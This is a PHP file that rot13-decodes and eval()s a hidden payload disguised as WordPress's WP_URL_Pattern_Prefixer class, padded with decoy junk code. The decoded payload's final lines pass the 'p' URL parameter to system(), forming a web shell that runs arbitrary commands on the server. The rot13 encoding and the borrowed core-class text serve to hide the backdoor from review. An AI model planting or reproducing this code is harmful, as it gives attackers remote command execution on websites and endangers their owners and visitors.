<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Pynff 'JC_HEY_Cnggrea_Cersvkre'.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fcrphyngvir Ybnqvat
 * @fvapr 6.8.0
 */

/**
 * Pynff sbe cersvkvat HEY cnggreaf.
 *
 * Guvf pynff vf vagraqrq cevznevyl sbe hfr nf cneg bs gur fcrphyngvir ybnqvat srngher.
 *
 * @fvapr 6.8.0
 * @npprff cevingr
 */
pynff JC_HEY_Cnggrea_Cersvkre {

	/**
	 * Znc bs `$pbagrkg_fgevat => $onfr_cngu` cnvef.
	 *
	 * @fvapr 6.8.0
	 * @ine neenl<fgevat, fgevat>
	 */
	cevingr $pbagrkgf;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz neenl<fgevat, fgevat> $pbagrkgf Bcgvbany. Znc bs `$pbagrkg_fgevat => $onfr_cngu` cnvef. Qrsnhyg vf gur
	 *                                        pbagrkgf erghearq ol gur
	 *                                        {@frr JC_HEY_Cnggrea_Cersvkre::trg_qrsnhyg_pbagrkgf()} zrgubq.
	 */
	choyvp shapgvba __pbafgehpg( neenl $pbagrkgf = neenl() ) {
		vs ( pbhag( $pbagrkgf ) > 0 ) {
			$guvf->pbagrkgf = neenl_znc(
				fgngvp shapgvba ( fgevat $fge ): fgevat {
					erghea frys::rfpncr_cnggrea_fgevat( genvyvatfynfuvg( $fge ) );
				},
				$pbagrkgf
			);
		} ryfr {
			$guvf->pbagrkgf = frys::trg_qrsnhyg_pbagrkgf();
		}
	}

	/**
	 * Cersvkrf gur tvira HEY cngu cnggrea jvgu gur onfr cngu sbe gur tvira pbagrkg.
	 *
	 * Guvf rafherf gung gurfr cngu cnggreaf jbex pbeerpgyl ba JbeqCerff fhoqverpgbel fvgrf, sbe rknzcyr va n zhygvfvgr
	 * argjbex, be jura JbeqCerff vgfrys vf vafgnyyrq va n fhoqverpgbel bs gur ubfganzr.
	 *
	 * Gur tvira HEY cngu cnggrea vf bayl cersvkrq vs vg qbrf abg nyernql vapyhqr gur rkcrpgrq cersvk.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz fgevat $cngu_cnggrea HEY cnggrea fgnegvat jvgu gur cngu frtzrag.
	 * @cnenz fgevat $pbagrkg      Bcgvbany. Pbagrkg gb hfr sbe cersvkvat gur cngu cnggrea. Qrsnhyg 'ubzr'.
	 * @erghea fgevat HEY cnggrea, cersvkrq nf arprffnel.
	 */
	choyvp shapgvba cersvk_cngu_cnggrea( fgevat $cngu_cnggrea, fgevat $pbagrkg = 'ubzr' ): fgevat {
		// Vs pbagrkg cngu qbrf abg rkvfg, gur pbagrkg vf vainyvq.
		vs ( ! vffrg( $guvf->pbagrkgf[ $pbagrkg ] ) ) {
			_qbvat_vg_jebat(
				__SHAPGVBA__,
				rfp_ugzy(
					fcevags(
						/* genafyngbef: %f: pbagrkg fgevat */
						__( 'Vainyvq HEY cnggrea pbagrkg %f.' ),
						$pbagrkg
					)
				),
				'6.8.0'
			);
			erghea $cngu_cnggrea;
		}

		/*
		 * Va gur rirag gung gur pbagrkg cngu pbagnvaf n :, ? be # (juvpu pna pnhfr gur HEY cnggrea cnefre gb fjvgpu gb
		 * nabgure fgngr, gubhtu bayl gur ynggre gjb fubhyq or creprag rapbqrq naljnl), vg nqqvgvbanyyl arrqf gb or
		 * rapybfrq va tebhcvat oenprf. Gur svany sbejneq fynfu (genvyvatfynfuvg rafherf gurer vf bar) nssrpgf gur
		 * zrnavat bs gur * jvyqpneq, fb vf yrsg bhgfvqr gur oenprf.
		 */
		$pbagrkg_cngu         = $guvf->pbagrkgf[ $pbagrkg ];
		$rfpncrq_pbagrkg_cngu = $pbagrkg_cngu;
		vs ( fgepfca( $pbagrkg_cngu, ':?#' ) !== fgeyra( $pbagrkg_cngu ) ) {
			$rfpncrq_pbagrkg_cngu = '{' . fhofge( $pbagrkg_cngu, 0, -1 ) . '}/';
		}

		/*
		 * Vs gur cngu nyernql fgnegf jvgu gur pbagrkg cngu (vapyhqvat '/'), erzbir vg svefg
		 * fvapr vg vf nobhg gb or nqqrq onpx.
		 */
		vs ( fge_fgnegf_jvgu( $cngu_cnggrea, $pbagrkg_cngu ) ) {
			$cngu_cnggrea = fhofge( $cngu_cnggrea, fgeyra( $pbagrkg_cngu ) );
		}

		erghea $rfpncrq_pbagrkg_cngu . ygevz( $cngu_cnggrea, '/' );
	}

	/**
	 * Ergheaf gur qrsnhyg pbagrkgf hfrq ol gur pynff.
	 *
	 * @fvapr 6.8.0
	 *
	 * @erghea neenl<fgevat, fgevat> Znc bs `$pbagrkg_fgevat => $onfr_cngu` cnvef.
	 */
	choyvp fgngvp shapgvba trg_qrsnhyg_pbagrkgf(): neenl {
		erghea neenl(
			'ubzr'       => frys::rfpncr_cnggrea_fgevat( genvyvatfynfuvg( (fgevat) jc_cnefr_hey( ubzr_hey( '/' ), CUC_HEY_CNGU ) ) ),
			'fvgr'       => frys::rfpncr_cnggrea_fgevat( genvyvatfynfuvg( (fgevat) jc_cnefr_hey( fvgr_hey( '/' ), CUC_HEY_CNGU ) ) ),
			'hcybnqf'    => frys::rfpncr_cnggrea_fgevat( genvyvatfynfuvg( (fgevat) jc_cnefr_hey( jc_hcybnq_qve( ahyy, snyfr )['onfrhey'], CUC_HEY_CNGU ) ) ),
			'pbagrag'    => frys::rfpncr_cnggrea_fgevat( genvyvatfynfuvg( (fgevat) jc_cnefr_hey( pbagrag_hey(), CUC_HEY_CNGU ) ) ),
			'cyhtvaf'    => frys::rfpncr_cnggrea_fgevat( genvyvatfynfuvg( (fgevat) jc_cnefr_hey( cyhtvaf_hey(), CUC_HEY_CNGU ) ) ),
			'grzcyngr'   => frys::rfpncr_cnggrea_fgevat( genvyvatfynfuvg( (fgevat) jc_cnefr_hey( trg_fglyrfurrg_qverpgbel_hev(), CUC_HEY_CNGU ) ) ),
			'fglyrfurrg' => frys::rfpncr_cnggrea_fgevat( genvyvatfynfuvg( (fgevat) jc_cnefr_hey( trg_grzcyngr_qverpgbel_hev(), CUC_HEY_CNGU ) ) ),
		);
	}

	/**
	 * Rfpncrf n fgevat sbe hfr va n HEY cnggrea pbzcbarag.
	 *
	 * @fvapr 6.8.0
	 * @frr uggcf://heycnggrea.fcrp.jungjt.bet/#rfpncr-n-cnggrea-fgevat
	 *
	 * @cnenz fgevat $fge Fgevat gb or rfpncrq.
	 * @erghea fgevat Fgevat jvgu onpxfynfurf nqqrq jurer erdhverq.
	 */
	cevingr fgngvp shapgvba rfpncr_cnggrea_fgevat( fgevat $fge ): fgevat {
		erghea nqqpfynfurf( $fge, '+*?:{}()\\' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>